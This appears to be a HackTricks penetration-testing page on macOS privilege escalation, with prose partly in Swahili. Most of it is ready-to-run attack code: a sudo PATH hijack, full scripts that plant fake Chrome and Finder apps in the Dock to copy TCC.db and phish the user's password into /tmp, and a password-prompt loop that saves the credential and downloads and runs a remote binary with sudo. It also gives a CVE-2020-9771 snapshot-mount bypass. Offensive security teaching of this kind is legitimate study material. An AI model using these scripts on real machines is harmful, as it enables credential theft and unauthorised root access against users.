# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

If you came here looking for TCC privilege escalation go to:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Tafadhali kumbuka kwamba **mikakati mingi kuhusu privilege escalation zinazowagusa Linux/Unix pia zitaathiri mashine za MacOS**. Kwa hivyo angalia:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Mwingiliano wa Mtumiaji

### Sudo Hijacking

You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Hata hivyo, macOS **inahifadhi** **`PATH`** ya mtumiaji anapotekeleza **`sudo`**. Hii inamaanisha kwamba njia nyingine ya kufanikisha shambulio hili ni **kuchukua udhibiti wa binaries nyingine** ambazo mwathiriwa bado atazitumia anapotekeleza **`sudo`**:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Kumbuka kwamba mtumiaji anayeitumia terminali ana uwezekano mkubwa kuwa na **Homebrew installed**. Kwa hivyo inawezekana kuiba binaries katika **`/opt/homebrew/bin`**.

### Dock Impersonation

Kwa kutumia **social engineering** unaweza **kuigiza, kwa mfano, Google Chrome** ndani ya dock na kwa kweli utekeleze script yako mwenyewe:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Mapendekezo kadhaa:

- Angalia katika Dock kama kuna Chrome, na katika kesi hiyo **ondoa** ile entry na **ongeza** **entry bandia ya Chrome katika nafasi ile ile** katika Dock array.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Mapendekezo kadhaa:

- Huwezi **kuondoa Finder kutoka kwenye Dock**, kwa hivyo ikiwa utaleta kwenye Dock, unaweza kuweka Finder bandia karibu kabisa na ile halisi. Kwa hili unahitaji **kuongeza kipengee cha Finder bandia mwanzoni mwa Dock array**.
- Chaguo jingine ni kutoiweka kwenye Dock na kuifungua tu; "Finder asking to control Finder" si jambo la kushangaza sana.
- Chaguo jingine kwa ajili ya **kupandisha hadi root bila kuuliza** nywila kwa kisanduku kibaya, ni kumfanya Finder kwa kweli aombe nywila ili kufanya kitendo chenye ruhusa:
- Muombe Finder nakili kwenye **`/etc/pam.d`** faili mpya ya **`sudo`** (Ujumbe unaouliza nywila utaonyesha kwamba "Finder wants to copy sudo")
- Muombe Finder nakili **Authorization Plugin** mpya (Unaweza kudhibiti jina la faili ili ujumbe unaouliza nywila uonyeshe kwamba "Finder wants to copy Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware mara nyingi hutumia mwingiliano wa mtumiaji ili **capture a sudo-capable password** na kuitumia tena kwa programu. Mtiririko wa kawaida:

1. Tambua mtumiaji aliyeingia kwa kutumia `whoami`.
2. **Loop password prompts** mpaka `dscl . -authonly "$user" "$pw"` irudishe mafanikio.
3. Hifadhi kredenshali (mfano, `/tmp/.pass`) na fanya vitendo vyenye mamlaka kwa kutumia `sudo -S` (password over stdin).

Mfano wa mnyororo mdogo:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Neno la siri lililodukuliwa linaweza kisha kutumika tena ku**ondoa karantini ya Gatekeeper kwa `xattr -c`**, kunakili LaunchDaemons au faili nyingine zenye vigezo vya juu, na kuendesha hatua zinazofuata bila mwingiliano.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Mtumiaji yeyote** (hata wale wasio na vibali) anaweza kuunda na mount Time Machine snapshot na **kupata FAILI ZOTE** za snapshot hiyo.\
**Vibali pekee** vinavyohitajika ni kwa programu inayotumika (kama `Terminal`) kuwa na **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambavyo vinapaswa kupewa na admin.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Maelezo ya kina yanaweza kupatikana [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Taarifa Nyeti

Hii inaweza kusaidia kupandisha ruhusa:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Marejeo

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
